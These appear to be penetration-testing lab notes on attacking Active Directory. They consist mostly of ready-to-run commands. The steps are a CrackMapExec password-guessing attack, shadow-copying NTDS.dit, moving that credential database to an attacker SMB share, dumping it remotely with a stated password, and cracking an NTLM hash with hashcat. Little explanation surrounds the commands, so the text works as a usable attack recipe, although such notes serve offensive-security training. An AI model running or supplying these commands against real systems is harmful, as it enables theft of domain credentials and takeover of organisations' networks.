# Attacking Active Directory & NTDS.dit
## Dictionary Attacks against AD accounts using CrackMapExec
### Launching the Attack with CrackMapExec

`crackmapexec smb 10.129.201.57 -u jmarston -p /usr/share/wordlists/fasttrack.txt`

## Capturing NTDS.dit
**Connecting to a DC with Evil-WinRM**

**Checking Local Group Membership**
We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.

```
PS > net localgroup
```

**Checking User Account Privileges including Domain**
```
PS > net user bwilliamson
```

**Creating Shadow Copy of C:**
```
PS > vssadmin CREATE SHADOW /For=C:
```

**Copying NTDS.dit from the VSS**
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

**Transferring NTDS.dit to Attack Host**
```
PS > cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

## A Faster Method: Using cme to Capture NTDS.dit
```
$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

## Cracking Hashes & Gaining Credentials
```
$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```